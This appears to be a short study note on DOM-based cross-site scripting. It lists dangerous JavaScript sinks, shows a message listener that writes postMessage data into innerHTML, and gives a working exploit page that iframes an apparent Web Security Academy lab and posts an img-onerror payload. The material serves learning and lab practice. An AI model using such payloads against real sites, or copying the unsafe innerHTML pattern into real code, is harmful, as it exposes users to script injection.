# DOM-based XSS

## Which sinks can lead to DOM-XSS vulnerabilities?

&#x20;The following are some of the main sinks that can lead to DOM-XSS vulnerabilities:

```javascript
document.write()
document.writeln()
document.domain
someDOMElement.innerHTML
someDOMElement.outerHTML
someDOMElement.insertAdjacentHTML
someDOMElement.onevent
```

## Example

### DOM-based XSS using web messages

code:

```javascript
window.addEventListener('message', function(e) {
    document.getElementById('ads').innerHTML = e.data;
})
```

exploit:

```markup
<html>
    <head>
        <title>DOM based vulns</title>
    </head>
    <body>
        <script>
            function callback() {
                document.getElementById('target_website').contentWindow.postMessage('<img src=x onerror=print(1)>', '*');
            }
        </script>
        <iframe id="target_website" onload="callback()" src="https://0aaf00bd043af66bc1010090000f00a5.web-security-academy.net/">
        </iframe>
    </body>
</html>
```
